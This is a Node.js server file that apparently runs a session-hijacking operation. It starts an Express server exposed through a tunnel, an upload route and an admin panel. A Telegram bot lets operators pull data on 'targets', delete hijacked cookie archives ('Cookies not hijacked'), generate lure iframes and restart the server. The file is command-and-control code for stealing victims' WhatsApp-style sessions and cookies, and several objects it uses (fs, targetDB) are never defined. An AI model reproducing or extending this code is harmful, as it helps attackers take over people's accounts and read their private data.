const process = global.process;
process.__dirname = __dirname;

const { serverInit, getConfig, cout } = require("./utils/server-helpers");
const expressFileupload = require("express-fileupload");
const { startTunnel } = require("./utils/tunnel");
const expressDevice = require("express-device");
const cookieParser = require("cookie-parser");
const socketIo = require("socket.io");
const electron = require("electron");
const express = require("express");
const http = require("http");
const path = require("path");
const TelegramBot = require('node-telegram-bot-api'); // Import Telegram bot library
const compression = require('compression'); // Import compression middleware
const morgan = require('morgan'); // Import morgan for logging

const app = express();
const server = http.createServer(app);
const io = new socketIo.Server(server);
const PORT = process.env.PORT || getConfig('port');

// Initialize Telegram Bot
const botToken = 'YOUR_TELEGRAM_BOT_TOKEN'; // Replace with your Telegram bot token
const bot = new TelegramBot(botToken, { polling: true });

// Setup server
serverInit();

// Use compression middleware to speed up responses
app.use(compression());

// Serve static files with caching enabled for better performance
app.use(express.static(path.join(__dirname, "public"), {
    maxAge: '1y', // Cache static assets for one year
    etag: false
}));

// Use morgan for logging HTTP requests
app.use(morgan('combined'));

// Parse URL-encoded bodies and JSON data
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

// Set view engine and views directory
app.set("views", path.join(__dirname, 'views'));
app.set("view engine", "ejs");

// Capture device information and parse cookies
app.use(expressDevice.capture());
app.use(cookieParser());

// File upload middleware is loaded only when needed
app.use("/ws-app", expressFileupload(), require("./router/ws-app"));

// CORS configuration
app.use(function (req, res, next) {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
    next();
});

// Admin routes
app.use("/", require("./router"));
app.use("/panel", require("./router/panel"));

// Start server and tunnel initialization in parallel
server.listen(PORT, async () => {
    try {
        const tunnelPromise = startTunnel();
        cout.out(`LOCAL SERVER  : http://localhost:${PORT}`);

        const tunnelUrl = await tunnelPromise;
        cout.out(`TUNNEL SERVER : ${tunnelUrl}`);
    } catch (error) {
        cout.err(`Failed to start tunnel: ${error.message}`);
    }
});

// Electron app initialization
electron.app.on("ready", () => {
    cout.out("Electron browser ready.");
});

// Handle all windows being closed
electron.app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') {
        electron.app.quit();
    }
});

// Telegram Bot command handlers

// Function to check if the message is from a group and addressed to the bot
const isMessageForBot = (msg) => {
    return msg.chat.type === 'group' || msg.chat.type === 'supergroup';
};

bot.onText(/\/get_data (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const targetId = match[1]; // Captures the target ID from the command

    if (!isMessageForBot(msg)) {
        bot.sendMessage(chatId, "This command is only available in groups.");
        return;
    }

    if (!targetDB.info().collections.includes(targetId)) {
        bot.sendMessage(chatId, "Target not found");
        return;
    }

    const targetCollection = targetDB.collection(targetId, false);
    const data = targetCollection.find({});
    bot.sendMessage(chatId, JSON.stringify(data, null, 2)); // Sends data as JSON
});

bot.onText(/\/clear_cookies (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const targetId = match[1];

    if (!isMessageForBot(msg)) {
        bot.sendMessage(chatId, "This command is only available in groups.");
        return;
    }

    const cookiesFilePath = path.join(__dirname, "ssd", "cookies", `${targetId}.wszip`);

    if (fs.existsSync(cookiesFilePath)) {
        fs.rmSync(cookiesFilePath, { recursive: true });
        const targetCollection = targetDB.collection(targetId, false);
        targetCollection.update({}, { cookies: "pending" });
        bot.sendMessage(chatId, "Cookies cleared");
    } else {
        bot.sendMessage(chatId, "Cookies not hijacked.");
    }
});

bot.onText(/\/generate_iframe (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const url = match[1]; // Captures the URL from the command

    if (!isMessageForBot(msg)) {
        bot.sendMessage(chatId, "This command is only available in groups.");
        return;
    }

    // Generate the iframe code
    const iframeCode = `<iframe src="${url}" width="600" height="400"></iframe>`;

    // Send the iframe code back to the user
    bot.sendMessage(chatId, `Here is your iframe code:\n${iframeCode}`);
});

bot.onText(/\/restart_server/, (msg) => {
    const chatId = msg.chat.id;

    if (!isMessageForBot(msg)) {
        bot.sendMessage(chatId, "This command is only available in groups.");
        return;
    }

    bot.sendMessage(chatId, "Server is restarting...");
    server.close(() => {
        process.exit(0);
    });
});
